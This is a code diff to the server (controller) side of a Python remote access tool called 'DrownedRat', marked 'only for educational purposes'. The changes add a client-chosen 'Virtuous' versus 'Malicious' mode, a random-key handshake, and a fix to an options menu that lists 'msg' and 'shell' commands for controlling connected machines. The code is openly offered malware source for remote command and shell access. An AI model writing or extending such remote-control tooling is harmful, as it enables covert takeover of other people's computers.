@@ -2,8 +2,8 @@
 +-----------------------------------------------------------------------+
 |                               DrownedRat                              |
 |    Author: 27016005                                                   |
-|    Version: 0.1.1                                                     |
-|    Last update: 09-02-2021 (dd-mm-yyyy)                               |
+|    Version: 0.2.2                                                     |
+|    Last update: 11-02-2021 (dd-mm-yyyy)                               |
 |                                                                       |
 |                 [   ONLY FOR EDUCATIONAL PURPOSES   ]                 |
 +-----------------------------------------------------------------------+
@@ -20,6 +20,8 @@ import socket
 import sys
 import os
 import time
+import random
+import string
 
 
 class Server:
@@ -48,9 +50,35 @@ class Server:
         self.client_socket, self.address = self.server.accept()
         print(f"*** Connection from {self.address} has been established! ***")
         self.connections.append(self.client_socket)
-        # # print('here')
+        # # safemode
+
+
+        mode = self.client_socket.recv(self.BUFFER_SIZE).decode("utf-8")
+        print(mode)
+        if mode == "2":
+            print("Virtuous mode")
+            self.connectionconfirm()
+        else:
+            print("Malicious mode")
         self.commands()
         # # print("hello worlds")
+
+    def generatekey(self):
+        # Creates a password containing uppercase, lowercase, numerical digits and punctuation.
+        letters = (string.ascii_letters + string.digits + string.punctuation)
+        code = ''.join(random.choices(letters, k=10))
+        # print("Key =  " + code)
+        return code
+
+    def connectionconfirm(self):
+        key = self.generatekey()
+        print("Key =  " + key)
+
+        self.client_socket.send(key.encode("utf-8"))
+
+        response = self.client_socket.recv(self.BUFFER_SIZE).decode()
+        if response == "MISMATCH":
+            self.close()
 
     def sendMsg(self):
         command = "msg"
@@ -215,7 +243,7 @@ class Server:
 
             print(output.decode("utf-8"))
 
-    def printOptions():
+    def printOptions(self):
         '''
         msg
         shell
